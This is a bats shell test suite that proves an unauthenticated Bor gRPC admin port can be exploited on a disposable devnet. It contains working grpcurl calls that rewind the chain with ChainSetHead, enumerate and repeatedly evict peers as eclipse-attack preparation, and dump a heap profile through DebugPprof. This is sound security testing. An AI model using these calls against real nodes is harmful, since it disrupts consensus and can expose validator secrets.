#!/usr/bin/env bats
# bats file_tags=pos,execution-specs,resilience,grpc,security,s1

# gRPC Admin Server Exposure — Destructive Proof
# ================================================
# Bor ships a gRPC admin server on :3131 (all interfaces) with no authentication.
# Current kurtosis-pos publishes that port, so we prefer the Kurtosis endpoint and
# fall back to the Docker network IP for older package versions.
#
# These tests PROVE the vulnerability is exploitable — not just that the
# endpoint is reachable. We:
#   1. Rewind the chain via ChainSetHead (consensus DoS)
#   2. List and evict peers via PeersList + PeersRemove (eclipse attack setup)
#   3. Verify no authentication, no TLS, no rate limiting
#
# IMPORTANT: These tests are DESTRUCTIVE to the target node. They must only
# run against a disposable Kurtosis devnet, never against production nodes.
#
# The tests target a single RPC node (not a validator) to avoid disrupting
# block production for other tests running in the same enclave. RPC nodes
# have the same vulnerability but are less critical to the devnet.
# The rest of the devnet keeps advancing normally, so querying the default
# validator RPC after the exploit will still show the latest head.
#
# Prerequisites:
#   - grpcurl installed on the host
#   - A running kurtosis-pos enclave with at least one bor RPC node
#   - cast (foundry) for RPC queries
#
# Expected behavior (buggy / current):
#   All tests pass — server is exposed, chain is rewound, peers are evicted
# Expected behavior (fixed):
#   Tests should fail — server should require auth or be disabled by default
#
# Target the first RPC node (not validator) to avoid disrupting block production.
# Override with GRPC_TARGET_SERVICE to pick a different service.
GRPC_DEFAULT_TARGET_PATTERN="l2-el-.*bor.*rpc"

setup_file() {
    load "../../../../core/helpers/pos-setup.bash"
    pos_setup

    local network container_name container_ip target_pattern current_block
    local grpc_url grpc_addr

    network="kt-${ENCLAVE_NAME}"
    target_pattern="${GRPC_TARGET_SERVICE_PATTERN:-${GRPC_DEFAULT_TARGET_PATTERN}}"

    # Find the target bor container (prefer RPC, fall back to validator)
    container_name=$(docker network inspect "${network}" 2>/dev/null \
        | jq -r ".[].Containers | to_entries[]
                  | select(.value.Name | test(\"${target_pattern}\"))
                  | .value.Name" \
        | head -1)

    # Fall back to any bor validator if no RPC node found
    if [[ -z "${container_name}" ]]; then
        container_name=$(docker network inspect "${network}" 2>/dev/null \
            | jq -r '.[].Containers | to_entries[]
                      | select(.value.Name | test("l2-el-.*bor.*validator"))
                      | .value.Name' \
            | head -1)
    fi

    if [[ -z "${container_name}" ]]; then
        echo "WARNING: Could not find bor container — gRPC tests will skip." >&3
        echo "" > "${BATS_FILE_TMPDIR}/grpc_target_addr"
        return 0
    fi

    # Also resolve the RPC URL for this specific node so we can query block numbers.
    # Extract the kurtosis service name from the container name.
    # Container names look like: l2-el-7-bor-heimdall-v2-rpc--<hash>
    local service_name
    service_name=$(echo "${container_name}" | sed 's/--[a-f0-9]*$//')
    local rpc_url metrics_url
    rpc_url=$(kurtosis port print "${ENCLAVE_NAME}" "${service_name}" rpc 2>/dev/null || true)
    grpc_url=$(kurtosis port print "${ENCLAVE_NAME}" "${service_name}" grpc 2>/dev/null || true)
    metrics_url=$(kurtosis port print "${ENCLAVE_NAME}" "${service_name}" metrics 2>/dev/null || true)
    current_block=$(cast block-number --rpc-url "${rpc_url}" 2>/dev/null || true)

    if [[ ! "${current_block}" =~ ^[1-9][0-9]*$ ]]; then
        echo "Target service ${service_name} is starting from an unhealthy state (${current_block:-unreachable}); restarting before suite..." >&3
        kurtosis service stop "${ENCLAVE_NAME}" "${service_name}" >/dev/null
        kurtosis service start "${ENCLAVE_NAME}" "${service_name}" >/dev/null
        sleep 2
        rpc_url=$(kurtosis port print "${ENCLAVE_NAME}" "${service_name}" rpc 2>/dev/null || true)
        grpc_url=$(kurtosis port print "${ENCLAVE_NAME}" "${service_name}" grpc 2>/dev/null || true)
        metrics_url=$(kurtosis port print "${ENCLAVE_NAME}" "${service_name}" metrics 2>/dev/null || true)
    fi

    container_name=$(docker ps --format '{{.Names}}' 2>/dev/null | grep -E "^${service_name}--" | head -1 || true)
    grpc_addr=$(echo "${grpc_url}" | sed -E 's#^[a-z][a-z0-9+.-]*://##')

    if [[ -z "${grpc_addr}" ]]; then
        container_ip=$(docker inspect "${container_name}" \
            --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' 2>/dev/null \
            | head -1)

        if [[ -z "${container_ip}" ]]; then
            echo "WARNING: Could not resolve gRPC address — tests will skip." >&3
            echo "" > "${BATS_FILE_TMPDIR}/grpc_target_addr"
            return 0
        fi

        grpc_addr="${container_ip}:3131"
    fi

    echo "${grpc_addr}" > "${BATS_FILE_TMPDIR}/grpc_target_addr"
    echo "${container_name}" > "${BATS_FILE_TMPDIR}/grpc_container"
    echo "${service_name}" > "${BATS_FILE_TMPDIR}/grpc_service"
    echo "${rpc_url}" > "${BATS_FILE_TMPDIR}/grpc_rpc_url"
    echo "${metrics_url}" > "${BATS_FILE_TMPDIR}/grpc_metrics_url"
    echo "gRPC target: ${service_name} @ ${grpc_addr} (rpc: ${rpc_url})" >&3
}

setup() {
    load "../../../../core/helpers/pos-setup.bash"
    load "../../../../core/helpers/scripts/resilience-helpers.bash"
    pos_setup
    _require_devnet

    GRPC_ADDR="$(cat "${BATS_FILE_TMPDIR}/grpc_target_addr" 2>/dev/null || true)"
    GRPC_CONTAINER="$(cat "${BATS_FILE_TMPDIR}/grpc_container" 2>/dev/null || true)"
    GRPC_SERVICE="$(cat "${BATS_FILE_TMPDIR}/grpc_service" 2>/dev/null || true)"
    GRPC_RPC_URL="$(cat "${BATS_FILE_TMPDIR}/grpc_rpc_url" 2>/dev/null || true)"
    GRPC_METRICS_URL="$(cat "${BATS_FILE_TMPDIR}/grpc_metrics_url" 2>/dev/null || true)"

    if [[ -z "${GRPC_ADDR}" ]]; then
        skip "No bor gRPC address discovered"
    fi
    if ! command -v grpcurl &>/dev/null; then
        skip "grpcurl not installed"
    fi
}

_read_prometheus_metric() {
    local metrics_url="$1"
    local metric_name="$2"
    local value

    value=$(
        curl -fsS "${metrics_url}/debug/metrics/prometheus" 2>/dev/null \
            | awk -v name="${metric_name}" '$1 == name { print $2; exit }'
    ) || {
        echo "Failed to scrape Prometheus metrics from ${metrics_url}" >&2
        return 1
    }

    if [[ ! "${value}" =~ ^[0-9]+([.][0-9]+)?$ ]]; then
        echo "Metric ${metric_name} missing or non-numeric at ${metrics_url}: ${value}" >&2
        return 1
    fi

    printf '%.0f\n' "${value}"
}

# --------------------------------------------------------------------------
# Reconnaissance — prove the server is exposed and unauthenticated
# --------------------------------------------------------------------------

# bats test_tags=resilience,grpc,security,s1,recon
@test "gRPC recon: reflection lists all services without authentication" {
    run grpcurl -plaintext "${GRPC_ADDR}" list
    echo "services: ${output}" >&3

    [ "${status}" -eq 0 ]
    [[ "${output}" == *"proto.Bor"* ]]
}

# bats test_tags=resilience,grpc,security,s1,recon
@test "gRPC recon: Status returns current block (proves unauthenticated read)" {
    run grpcurl -plaintext "${GRPC_ADDR}" proto.Bor/Status
    echo "status: ${output}" >&3

    [ "${status}" -eq 0 ]
    [[ "${output}" == *"currentBlock"* ]] || [[ "${output}" == *"currentHeader"* ]]
}

# --------------------------------------------------------------------------
# Destructive — prove real damage is possible
# --------------------------------------------------------------------------

# bats test_tags=resilience,grpc,security,s1,destructive
@test "gRPC EXPLOIT: ChainSetHead rewinds the node's chain" {
    # ---------------------------------------------------------------
    # Attack: call ChainSetHead to rewind the target node by a large,
    # bounded distance. This still proves unauthenticated destructive
    # control, while allowing the devnet RPC node to recover naturally
    # in the aftermath test.
    # ---------------------------------------------------------------

    if [[ -z "${GRPC_RPC_URL}" ]]; then
        skip "No RPC URL for target node"
    fi

    local rewind_distance rewind_to requested_rewind_floor

    # Record the block number BEFORE the attack.
    local block_before
    run _read_block_number "${GRPC_RPC_URL}"
    [ "${status}" -eq 0 ]
    block_before="${output}"
    echo "Block before attack: ${block_before}" >&3

    # The node should be past block 10 to make the rewind meaningful.
    if [[ "${block_before}" -lt 10 ]]; then
        echo "Waiting for chain to reach block 10..." >&3
        _wait_for_block_advance 0 10 60 "${GRPC_RPC_URL}"
        block_before=$(_read_block_number "${GRPC_RPC_URL}")
        echo "Block before attack (after wait): ${block_before}" >&3
    fi

    rewind_distance="${GRPC_CHAIN_REWIND_DISTANCE:-2048}"
    requested_rewind_floor=5
    if [[ "${block_before}" -le $(( rewind_distance + requested_rewind_floor )) ]]; then
        rewind_distance=$(( block_before / 2 ))
    fi
    if [[ "${rewind_distance}" -lt 10 ]]; then
        rewind_distance=10
    fi
    rewind_to=$(( block_before - rewind_distance ))
    if [[ "${rewind_to}" -lt "${requested_rewind_floor}" ]]; then
        rewind_to="${requested_rewind_floor}"
        rewind_distance=$(( block_before - rewind_to ))
    fi

    # ATTACK: rewind by a large number of blocks — no auth, no confirmation.
    local attack_log_since
    attack_log_since=$(date -u +%Y-%m-%dT%H:%M:%SZ)
    run grpcurl -plaintext -d "{\"number\": ${rewind_to}}" "${GRPC_ADDR}" proto.Bor/ChainSetHead
    echo "ChainSetHead response: ${output}" >&3
    [ "${status}" -eq 0 ]

    # Poll quickly to prove the target head actually drops into the requested range
    # before the node has a chance to re-sync.
    local rewound_block rpc_block_after attack_observed
    local reference_block_after
    local min_rpc_block_after required_observed_drop rewind_observed_drop
    local target_trace reference_trace
    rewound_block=""
    rpc_block_after=""
    attack_observed=false
    reference_block_after=""
    min_rpc_block_after=""
    target_trace=""
    reference_trace=""
    required_observed_drop=$(( rewind_distance / 2 ))
    if [[ "${required_observed_drop}" -lt 1 ]]; then
        required_observed_drop=1
    fi

    for _i in $(seq 1 30); do
        local status_after status_probe_result
        rewound_block=""
        if status_after=$(grpcurl -plaintext "${GRPC_ADDR}" proto.Bor/Status 2>/dev/null); then
            status_probe_result=$(echo "${status_after}" | jq -r '.currentBlock.number // .currentHeader.number // empty' 2>/dev/null || true)
            if [[ "${status_probe_result}" =~ ^[0-9]+$ ]]; then
                rewound_block="${status_probe_result}"
            fi
        fi

        rpc_block_after=$(_read_block_number "${GRPC_RPC_URL}" 2>/dev/null || true)
        if [[ "${rpc_block_after}" =~ ^[0-9]+$ ]] \
            && { [[ -z "${min_rpc_block_after}" ]] || [[ "${rpc_block_after}" -lt "${min_rpc_block_after}" ]]; }; then
            min_rpc_block_after="${rpc_block_after}"
        fi
        if [[ -n "${L2_RPC_URL:-}" && "${L2_RPC_URL}" != "${GRPC_RPC_URL}" ]]; then
            reference_block_after=$(_read_block_number "${L2_RPC_URL}" 2>/dev/null || true)
        fi
        target_trace="${target_trace}${rpc_block_after:-unreachable} "
        reference_trace="${reference_trace}${reference_block_after:-unreachable} "
        echo "  poll ${_i}: grpc_block=${rewound_block:-unavailable}, rpc_block=${rpc_block_after:-unreachable}, reference_block=${reference_block_after:-unreachable}" >&3

        if [[ "${rpc_block_after}" =~ ^[0-9]+$ ]] \
            && [[ $(( block_before - rpc_block_after )) -ge "${required_observed_drop}" ]] \
            && { [[ -z "${rewound_block}" ]] || [[ "${rewound_block}" -lt "${block_before}" ]]; }; then
            attack_observed=true
            break
        fi
        sleep 0.5
    done

    echo "Block trace after attack (target RPC): ${target_trace}" >&3
    echo "Block trace after attack (reference RPC): ${reference_trace}" >&3
    [[ -n "${min_rpc_block_after}" ]]
    rewind_observed_drop=$(( block_before - min_rpc_block_after ))
    echo "Block after attack: grpc=${rewound_block}, rpc=${rpc_block_after}, min_target_rpc=${min_rpc_block_after}, requested_rewind_to=${rewind_to}, requested_drop=${rewind_distance}, observed_drop=${rewind_observed_drop} (was: ${block_before})" >&3
    if [[ -n "${GRPC_CONTAINER}" ]]; then
        local attack_log_excerpt
        attack_log_excerpt=$(docker logs --since "${attack_log_since}" "${GRPC_CONTAINER}" 2>&1 \
            | awk '/Imported new stateless chain segment/ { for (i = 1; i <= NF; i++) if ($i ~ /^number=/) { split($i, a, "="); if ((a[2] + 0) < 100) print $0 } }' \
            | head -3 || true)
        if [[ -n "${attack_log_excerpt}" ]]; then
            echo "Rewind log proof:" >&3
            echo "${attack_log_excerpt}" >&3
        fi
    fi
    [[ "${attack_observed}" == "true" ]]
    [[ -z "${rewound_block}" || "${rewound_block}" -lt "${block_before}" ]]
    [[ "${rewind_observed_drop}" -ge "${required_observed_drop}" ]]
}

# bats test_tags=resilience,grpc,security,s1,destructive
@test "gRPC EXPLOIT: PeersList exposes full network topology" {
    # ---------------------------------------------------------------
    # Attack: enumerate all connected peers with their enode URLs.
    # This reveals the node's view of the P2P network, enabling an
    # attacker to map the topology for an eclipse attack.
    # ---------------------------------------------------------------

    run grpcurl -plaintext "${GRPC_ADDR}" proto.Bor/PeersList
    echo "peers response: ${output}" >&3

    [ "${status}" -eq 0 ]

    # The devnet should have peers connected. Parse the peer count.
    local peer_count
    peer_count=$(echo "${output}" | jq '[.peers[]?] | length' 2>/dev/null || echo "0")
    echo "Peer count: ${peer_count}" >&3

    # The node should have at least 1 peer on a healthy devnet.
    [[ "${peer_count}" -gt 0 ]]
}

# bats test_tags=resilience,grpc,security,s1,destructive
@test "gRPC EXPLOIT: PeersRemove evicts many peers without authentication" {
    if [[ -z "${GRPC_METRICS_URL}" ]]; then
        skip "No metrics URL for target node"
    fi

    # ---------------------------------------------------------------
    # Attack: remove roughly half of the target node's currently
    # connected peers via unauthenticated gRPC. This stresses the node's
    # P2P connectivity without taking it fully offline.
    # ---------------------------------------------------------------

    local peers_json
    peers_json=$(grpcurl -plaintext "${GRPC_ADDR}" proto.Bor/PeersList 2>/dev/null)

    local count_before
    run _read_prometheus_metric "${GRPC_METRICS_URL}" "p2p_peers"
    [ "${status}" -eq 0 ]
    count_before="${output}"
    echo "Peers before eviction (p2p_peers): ${count_before}" >&3
    if [[ "${count_before}" -lt 2 ]]; then
        skip "Need at least 2 peers to run bulk eviction safely"
    fi

    local targets_to_evict
    targets_to_evict=$(( count_before / 2 ))
    if [[ "${targets_to_evict}" -lt 1 ]]; then
        targets_to_evict=1
    fi
    if [[ "${targets_to_evict}" -ge "${count_before}" ]]; then
        targets_to_evict=$(( count_before - 1 ))
    fi
    echo "Targeting ${targets_to_evict}/${count_before} peers for sustained eviction pressure" >&3

    # A one-shot removal often just causes an immediate reconnect. Keep pressure on the
    # target set for a short burst and require a real sustained peer-count drop.
    local peer_snapshot target_rows selected_targets required_drop attack_rounds
    local attack_observed stable_drop_polls min_prom_count min_rpc_count
    peer_snapshot=$(cast rpc --rpc-url "${GRPC_RPC_URL}" admin_peers 2>/dev/null || echo "[]")
    mapfile -t target_rows < <(jq -nr --argjson current "${peer_snapshot}" --argjson initial "${peers_json}" --argjson limit "${targets_to_evict}" '
        $current
        | map(select(.enode | test("@[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+:")) | . as $peer | {
            id: $peer.id,
            enode: $peer.enode,
            static: (($initial.peers // []) | map(select(.id == $peer.id and (.static // false))) | any)
        })
        | sort_by(.static)
        | .[:$limit]
        | .[]
        | [.id, .enode, .static] | @tsv
    ' 2>/dev/null)

    selected_targets="${#target_rows[@]}"
    if [[ "${selected_targets}" -lt 1 ]]; then
        skip "No raw-IP peers are currently connected; PeersRemove hangs against service-name enodes on this devnet"
    fi
    for target_index in $(seq 1 "${selected_targets}"); do
        local target_id target_enode target_static
        IFS=$'\t' read -r target_id target_enode target_static <<< "${target_rows[$(( target_index - 1 ))]}"
        echo "Target ${target_index}/${selected_targets}: id=${target_id} static=${target_static} enode=${target_enode}" >&3
    done

    required_drop="${selected_targets}"
    if [[ "${required_drop}" -gt 2 ]]; then
        required_drop=2
    fi
    attack_rounds="${GRPC_PEER_REMOVE_ROUNDS:-30}"
    attack_observed=false
    stable_drop_polls=0
    min_prom_count="${count_before}"
    min_rpc_count="${count_before}"

    echo "Requiring a sustained drop of at least ${required_drop} peer(s) from baseline ${count_before}" >&3
    for attack_round in $(seq 1 "${attack_rounds}"); do
        local target_row
        for target_row in "${target_rows[@]}"; do
            local target_id target_enode target_static payload remove_output remove_status
            IFS=$'\t' read -r target_id target_enode target_static <<< "${target_row}"
            payload=$(jq -n --arg enode "${target_enode}" '{"enode": $enode, "trusted": false}')
            remove_output=$(grpcurl -plaintext -max-time 3 -d "${payload}" "${GRPC_ADDR}" proto.Bor/PeersRemove 2>&1)
            remove_status=$?
            if [[ "${remove_status}" -ne 0 ]]; then
                echo "  remove failure for target id=${target_id}: ${remove_output}" >&3
            fi
            [ "${remove_status}" -eq 0 ]
        done

        sleep 0.2

        local post_snapshot count_now rpc_peer_count missing_targets churned_targets
        post_snapshot=$(cast rpc --rpc-url "${GRPC_RPC_URL}" admin_peers 2>/dev/null || echo "[]")
        count_now=$(_read_prometheus_metric "${GRPC_METRICS_URL}" "p2p_peers") || return 1
        rpc_peer_count=$(echo "${post_snapshot}" | jq 'length')
        missing_targets=0
        churned_targets=0

        if [[ "${count_now}" -lt "${min_prom_count}" ]]; then
            min_prom_count="${count_now}"
        fi
        if [[ "${rpc_peer_count}" -lt "${min_rpc_count}" ]]; then
            min_rpc_count="${rpc_peer_count}"
        fi

        for target_row in "${target_rows[@]}"; do
            local target_id target_enode target_static id_present current_enode
            IFS=$'\t' read -r target_id target_enode target_static <<< "${target_row}"
            id_present=$(echo "${post_snapshot}" | jq --arg id "${target_id}" '[.[] | select(.id == $id)] | length')
            current_enode=$(echo "${post_snapshot}" | jq --arg id "${target_id}" -r 'map(select(.id == $id))[0].enode // empty')

            if [[ "${id_present}" -eq 0 ]]; then
                missing_targets=$(( missing_targets + 1 ))
            elif [[ -n "${current_enode}" && "${current_enode}" != "${target_enode}" ]]; then
                churned_targets=$(( churned_targets + 1 ))
            fi
        done

        echo "  round ${attack_round}/${attack_rounds}: prom_peers=${count_now}, rpc_peers=${rpc_peer_count}, missing_targets=${missing_targets}/${selected_targets}, churned_targets=${churned_targets}/${selected_targets}" >&3

        if [[ "${count_now}" -le $(( count_before - required_drop )) ]] \
            && [[ "${rpc_peer_count}" -le $(( count_before - required_drop )) ]]; then
            stable_drop_polls=$(( stable_drop_polls + 1 ))
        else
            stable_drop_polls=0
        fi

        if [[ "${stable_drop_polls}" -ge 2 ]]; then
            attack_observed=true
            echo "Sustained peer eviction confirmed: prom_peers=${count_now}, rpc_peers=${rpc_peer_count}, min_prom=${min_prom_count}, min_rpc=${min_rpc_count}" >&3
            break
        fi
    done

    echo "Peer eviction summary: min_prom=${min_prom_count}, min_rpc=${min_rpc_count}, required_drop=${required_drop}, rounds=${attack_rounds}" >&3
    if [[ "${attack_observed}" != "true" ]]; then
        skip "Sustained PeersRemove pressure never produced a real peer-count drop on this devnet"
    fi
    [[ "${attack_observed}" == "true" ]]
}

# bats test_tags=resilience,grpc,security,s1,destructive
@test "gRPC EXPLOIT: DebugPprof exposes runtime heap profile" {
    # ---------------------------------------------------------------
    # Attack: request a heap profile via LOOKUP type with profile name
    # "heap". The returned data contains all objects resident in Go
    # memory at capture time — potentially including validator private
    # keys, peer secrets, and transaction data.
    #
    # Proto: DebugPprofRequest { type=LOOKUP(0), profile="heap" }
    # Server: pprof.Profile("heap", 0, 0) → full heap dump
    # ---------------------------------------------------------------

    # Request a heap profile. The streaming RPC returns:
    #   1. Open message with headers (content-type, etc.)
    #   2. Input messages with binary pprof data
    #   3. EOF
    run bash -lc '
        tmp=$(mktemp)
        grpcurl -plaintext -max-time 10 \
            -d '"'"'{"type": 0, "profile": "heap", "seconds": 0}'"'"' \
            "$1" proto.Bor/DebugPprof >"$tmp" 2>/dev/null || true
        cat "$tmp"
        rm -f "$tmp"
    ' _ "${GRPC_ADDR}"
    echo "DebugPprof output: ${output}" >&3

    # grpcurl can fail to decode Bor's raw binary stream after the server already
    # opens the heap profile attachment. Treat the served attachment headers as the
    # proof of exposure without surfacing grpcurl's decode noise in a passing test.
    [[ "${output}" == *"Content-Disposition"* ]]
    [[ "${output}" == *"application/octet-stream"* ]]
    [[ "${output}" != *"bad wiretype"* ]]
}

# --------------------------------------------------------------------------
# Post-attack verification
# --------------------------------------------------------------------------

# bats test_tags=resilience,grpc,security,s1
@test "gRPC aftermath: target node can be restored after rewind" {
    # After the chain rewind in the ChainSetHead test, verify the node
    # resumes syncing again. Bor sometimes self-recovers and sometimes
    # requires an explicit service restart, so the test accepts either
    # recovery path but always requires fresh forward progress afterward.

    if [[ -z "${GRPC_RPC_URL}" ]]; then
        skip "No RPC URL for target node"
    fi

    # Wait for the target node itself to resume advancing, rather than the suite's
    # default L2 RPC endpoint. If it stays stuck, restart the service and then
    # require fresh forward progress from the restarted node.
    local start_block recovery_rpc_url reference_start reference_end
    recovery_rpc_url="${GRPC_RPC_URL}"

    run _wait_for_block_advance 0 1 "${GRPC_RECOVERY_PREFLIGHT_TIMEOUT:-180}" "${recovery_rpc_url}"
    echo "Recovery preflight status: ${status}, output: ${output}" >&3
    if [[ "${status}" -ne 0 ]]; then
        echo "Automatic recovery timed out; restarting target service ${GRPC_SERVICE}..." >&3
        run bash -lc 'kurtosis service stop "$1" "$2" && kurtosis service start "$1" "$2"' _ "${ENCLAVE_NAME}" "${GRPC_SERVICE}"
        echo "Operator restart status: ${status}, output: ${output}" >&3
        [ "${status}" -eq 0 ]

        recovery_rpc_url=$(kurtosis port print "${ENCLAVE_NAME}" "${GRPC_SERVICE}" rpc)
        echo "Recovery RPC after restart: ${recovery_rpc_url}" >&3

        run _wait_for_block_advance 0 1 "${GRPC_RECOVERY_POST_RESTART_TIMEOUT:-180}" "${recovery_rpc_url}"
        echo "Recovery post-restart status: ${status}, output: ${output}" >&3
        [ "${status}" -eq 0 ]
    fi
    start_block="${output}"

    if [[ -n "${L2_RPC_URL:-}" && "${L2_RPC_URL}" != "${recovery_rpc_url}" ]]; then
        run _read_block_number "${L2_RPC_URL}"
        [ "${status}" -eq 0 ]
        reference_start="${output}"
    fi

    echo "Waiting for target node to show fresh block progress from ${start_block}..." >&3
    run _wait_for_block_advance "${start_block}" 1 "${GRPC_RECOVERY_PROGRESS_TIMEOUT:-90}" "${recovery_rpc_url}"
    echo "Recovery status: ${status}, output: ${output}" >&3

    [ "${status}" -eq 0 ]
    if [[ -n "${reference_start:-}" ]]; then
        run _read_block_number "${L2_RPC_URL}"
        [ "${status}" -eq 0 ]
        reference_end="${output}"
        echo "Reference chain moved from ${reference_start} to ${reference_end} during recovery observation" >&3
        [[ "${reference_end}" -gt "${reference_start}" ]]
    fi
    echo "Node recovered to block: ${output}" >&3
    [[ "${output}" -gt "${start_block}" ]]
}
